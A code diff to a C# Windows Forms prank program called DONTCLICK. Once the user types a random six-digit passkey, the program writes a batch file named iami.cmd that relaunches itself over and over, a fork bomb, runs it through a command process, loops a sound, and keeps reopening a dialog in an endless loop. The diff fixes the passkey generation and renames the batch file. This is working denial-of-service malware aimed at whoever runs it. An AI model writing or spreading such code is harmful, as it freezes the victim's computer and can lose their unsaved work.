@@ -26,7 +26,7 @@ namespace DONTCLICK
         private void Form1_Load(object sender, EventArgs e)
         {
             Random rd = new Random();
-            rdPassKey = rd.Next().ToString().Substring(3, 6);
+            rdPassKey = (rd.Next().ToString().Substring(3)+"000000").Substring(0,6);
             label1.Text = "输入 "+rdPassKey+" 以继续.";
 
             #region Process CMD Conf
@@ -45,16 +45,15 @@ namespace DONTCLICK
             if (textBox1.Text == rdPassKey)
             {
                 Form2 fm2 = new Form2();
-                File.Create(@".\wswzj.cmd").Close();
-                StreamWriter swriter = new StreamWriter(@".\0.cmd");
-                swriter.WriteLine("start 0");
-                swriter.WriteLine(".\\0");
+                StreamWriter swriter = new StreamWriter(@".\iami.cmd");
+                swriter.WriteLine("start iami");
+                swriter.WriteLine(".\\iami");
                 swriter.Close();
                 Stream ssm = global::DONTCLICK.Properties.Resources.monofly;
                 SoundPlayer plyr = new SoundPlayer(ssm);
                 plyr.Load();
                 plyr.PlayLooping();
-                p.StandardInput.WriteLine(".\\0");
+                p.StandardInput.WriteLine(".\\iami");
                 while (true)
                 {
                     fm2.ShowDialog();
